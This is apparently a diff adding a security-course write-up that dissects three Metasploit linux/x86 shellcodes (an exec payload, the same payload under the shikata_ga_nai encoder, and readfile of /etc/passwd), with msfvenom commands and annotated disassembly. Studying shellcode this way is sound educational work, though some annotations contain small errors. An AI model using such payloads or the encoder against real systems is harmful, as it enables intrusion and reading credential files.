@@ -1541,3 +1541,218 @@ uid=0(root) gid=0(root) groups=0(root)
 
 I hope you've enjoyed learning about custom encoders/decoders and implementing them in assembly!
 
+
+
+# Assignment 5
+# MSF Analysis Requirements
+- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
+- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
+- Present your analysis
+
+## Context
+
+For this assignment we are going to dissect three different shellcodes generated with metasploit. Cool right ? It might allow us to diversify our opcodes knowledge and find new pattern and tricks in assembly!
+
+## Standard exec shellcode with CMD= 
+First, we start with a simple yet well known payload, linux/x86/exec. Generate it with msfvenom -p linux/86/exec -f raw CMD="echo SLAEisrad" > msfcmd.raw
+
+Then you can disassemble it with ndisasm -u msfcmd.raw.
+
+I will provide analysis directly inside the disassembly. If you want to run it or analyse it dynamically you can export it to elf format with -f elf and run it with gdb or libemu.
+```
+; lets disassemble 
+ndisasm -u msfcmd.raw 
+00000000  6A0B              push byte +0xb ; push 11 which corresponds to syscall execve 
+00000002  58                pop eax ; put pushed 11 into eax 
+00000003  99                cdq ; this artifact put 0 into edx and is shorter than xor, kinda cool  
+00000004  52                push edx ; push 0 
+00000005  66682D63          push word 0x632d ; push "-c" for "/bin/sh -c" 
+00000009  89E7              mov edi,esp ; push pointer to this string in edi
+0000000B  682F736800        push dword 0x68732f ; push "/sh" , it contains null byte by default so we need to instruct msf to avoid it next time :] 
+00000010  682F62696E        push dword 0x6e69622f ; push "/bin"
+00000015  89E3              mov ebx,esp ; move the pointer to this string "/bin/sh" to ebx 
+00000017  52                push edx ; push 0 again 
+00000018  E80F000000        call dword 0x2c; call function at +0x44 bytes , so the rest of the ndisasm is wrong 
+; call function push the return address onto the stack, its a trick to have a pointer to the following string 
+; and the following string at 0x18 +4(this instruction is 4 bytes) +1(return address) is   
+
+p 0x18+4+1
+$1 = 0x1d
+p/u 0x1d
+$2 = 29
+; i always misscompute :] 
+
+hd -s 29  msfcmd.raw 
+0000001d  65 63 68 6f 20 53 4c 41  45 69 73 72 61 64 00 57  |echo SLAEisrad.W|
+[...] 
+
+; lets disassemble the remaining part 
+ndisasm -u -e 44 msfcmd.raw 
+00000000  57                push edi ; push the pointer to "-c" 
+00000001  53                push ebx ; push the pointer to "/bin/sh" 
+00000002  89E1              mov ecx,esp ; put this list of args into ecx for syscall execve 
+00000004  CD80              int 0x80 ; syscall interupt 
+
+;lets verify the syscall
+execve("/bin/sh", ["/bin/sh", "-c", "echo SLAEisrad"], NULL) = 0
+;done 
+```
+
+
+## Shikata_ga_nai
+As I am willing to understand polymorphic virus and encoders, I take this exercise as an opportunity to analyse shikata_ga_nai. We will generate the exact same shellcode as previously but this time encoded with the famous encoder.
+
+Generate it (using only one round) with :
+
+msfvenom -p linux/86/exec -c 1 -e shikata_ga_nai -f raw CMD="echo SLAEisrad" > shikatamsfcmd.raw
+
+Now lets see what is this encoder doing... As a sidenote you can have a better "view" in disassembly using libemu compared to gdb.
+```
+; SLAE-970
+; thanks to previous students write ups 
+; assignment 5.2: analyse metasploit shellcodes
+; originality: lets deal with infamous shikata ga nai encryption !!! 
+; msfvenom -p linux/x86/exec -e x86/shikata_ga_nai -c 1 -f raw CMD="echo SLAEisrad" > msfcmdshikata.raw
+
+The most accurate disassembly is dynamic analysis, because instructions are decrypted on the fly !   
+so lets analyse this in gdb (or libemu if you want) 
+WARNING: do not run untrusted shellcode in gdb before analyzing them securely first  
+
+gdb$ x/20i $eip 
+=> 0x8048054:   mov    edi,0x1e1d3ccf ;  mov edx,0x9b4fd75e ; mov a random number into edx, changes everytime
+   0x8048059:   fxch   st(0) ; static disas show "fld st(2)" instruction however,
+; dynamic exec shows that is  fxch st(0), exchange st0 with st2, see under;
+; before
+; st0            0      (raw 0x00000000000000000000)
+; after
+; st0            -nan(0xc000000000000000)       (raw 0xffffc000000000000000)
+   0x804805b:   fnstenv [esp-0xc] ; this instruction loads eip (env) into the stack 
+   0x804805f:   pop    edx; edx now contains eip, 0x08048059
+   0x8048060:   sub    ecx,ecx ; this means zero minus zero i dont understand its usage, useless op ? 
+   0x8048062:   mov    cl,0xd ; put 13 into ecx for looping xor, decrypt 13 * 4 bytes 
+;loop starts here  
+   0x8048064:   sub    edx,0xfffffffc ; remove -4 (+4) from eip so now 0x0804805D
+   0x8048067:   xor    DWORD PTR [edx+0x10],edi ; decrypt the shellcode at 0x0804805D+0x10 (6D) with random key 
+   0x804806a:   add    edi,DWORD PTR [edx+0x10] ; add the result to the key (chained mode encryption) 
+
+REMARK : the above 2 instructions will always stay equivalent
+but will be polymorphic !! 
+it means each time you generate a shellcode, it will vary but does the same 
+example other generation : 
+example other gen: 00000010  315614            xor [esi+0x14],edx; now this use edx and esi and different size (0x14) 
+example other gen: 00000013  035614            add edx,[esi+0x14]; still chained though 
+
+the next OP was wrong 0x804806d:        sub    eax,0xe91577c9 ; it needs to be decrypted first 
+; with decryption it transforms to 
+ 0x804806d:     loop   0x8048064 ; makes more sense now :] 
+; loop ends here 
+
+We continue to analyse after decryption 
+lets break after decryption and read instructions 
+gdb$ x/20i $eip
+It is way more standard stuff now, its exactly the same as assignment 5.1 
+=> 0x804806f:   push   0xb ; push 13 
+   0x8048071:   pop    eax ; put 13 into eax, execve syscall  
+   0x8048072:   cdq   ; 
+   0x8048073:   push   edx ; 
+   0x8048074:   pushw  0x632d ; "-c" 
+   0x8048078:   mov    edi,esp ; 
+   0x804807a:   push   0x68732f ; "/sh" 
+Interestingly this was containing null byte decrypted previously
+but in encrypted format null byte was avoided, double usage of encryption 
+   0x804807f:   push   0x6e69622f "/bin" 
+   0x8048084:   mov    ebx,esp  
+   0x8048086:   push   edx
+   0x8048087:   call   0x804809b ; we see the call trick again, push next instruction pointer to stack 
+; which contains the payload of "/bin/sh -c" 
+; proof : 
+cx/1s 0x804808c
+c0x804808c:      "echo SLAEisrad"
+
+; syscall finally 
+gdb$ x/4i 0x804809b
+   0x804809b:   push   edi ; push ptr to "-c"
+   0x804809c:   push   ebx ; push ptr to "/bin/sh" 
+   0x804809d:   mov    ecx,esp ; move pointer to arguments in ecx  
+   0x804809f:   int    0x80 ; execve  
+```
+
+As a conclusion one round of  shikata ga nai does : 
+1. elect a random number for key 
+2. use XOR for encrypt / decrypt with various registers and size 
+3. decrypt the upcoming instructions with this key and seed with the result for next decryption 
+
+
+Remarks: 
+This is what ndisasm, static disassembly, shows for second instruction :  
+00000005  D9C2              fld st2 ; why fld instead of fxch st(0) , needs to figure out why  
+This Gist brought to you by gist-it.view rawas5/analysismsf2.txt
+
+
+Alright. Job done. Shikata_ga_nai is encoding the shellcode with a XOR with random key using different instructions but which create the same decoding in the end.
+
+
+
+
+
+## Readfile
+We need to progress in linux/x86 so lets check another msf shellcode with more syscalls and analyze it.
+
+```
+; SLAE-970
+; thanks to previous students write ups 
+; assignment 5.3: analyse metasploit shellcodes
+; originality: lets check syscall for readfile 
+; msfvenom -p linux/x86/readfile -f raw PATH="/etc/passwd" > msfcmdread.raw
+
+; here are the syscalls used by this shellcode: open,read,write 
+
+; first it jumps to 0x38 
+00000000  EB36              jmp short 0x38 ; jump
+
+; the following is syscall open 
+00000002  B805000000        mov eax,0x5; prepare the open syscall
+; here is the function 
+; int open(const char *pathname, int flags);
+00000007  5B                pop ebx ; the string is inside the ebx register 
+00000008  31C9              xor ecx,ecx ; 0 as flags, so O_RDONLY 
+0000000A  CD80              int 0x80
+;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5 
+;#define __NR_open                5
+; open("/etc/passwd", O_RDONLY)           = 3
+
+; the following is syscall read 
+0000000C  89C3              mov ebx,eax ; store the resulting fd in ebx 
+0000000E  B803000000        mov eax,0x3 ; syscall read 
+; #define __NR_read               3
+00000013  89E7              mov edi,esp ; stack address to edi 
+00000015  89F9              mov ecx,edi ; destination of the read is the stack :] 
+00000017  BA00100000        mov edx,0x1000 ; size to 4096 
+0000001C  CD80              int 0x80 ; syscall 
+
+; the following is syscall write
+; function is ssize_t write(int fd, const void *buf, size_t count); 
+0000001E  89C2              mov edx,eax ; result is inside edx, edx is the size  
+00000020  B804000000        mov eax,0x4 ; syscal write 
+00000025  BB01000000        mov ebx,0x1 ; output to stdout = 1, ebx is fd  
+; for info ecx still points to the string read and is argument 2, ecx is the buffer 
+0000002A  CD80              int 0x80 ; syscall 
+
+; syscall exit , clean exit 
+0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+
+; jump here 
+00000038  E8C5FFFFFF        call dword 0x2 ; call 0x2, and push the return address onto the stack 
+
+; so the following bytes are probably a string, and not random opcodes
+
+0000003D  2F                das [...] ; wrong disass
+; surprise surprise :] lets check string 
+hd -s 0x3d msfread.raw 
+0000003d  2f 65 74 63 2f 70 61 73  73 77 64 00              |/etc/passwd.|
+; this is the path we want to open 
+```
+
+I hope you've enjoyed learning about malware analysis!
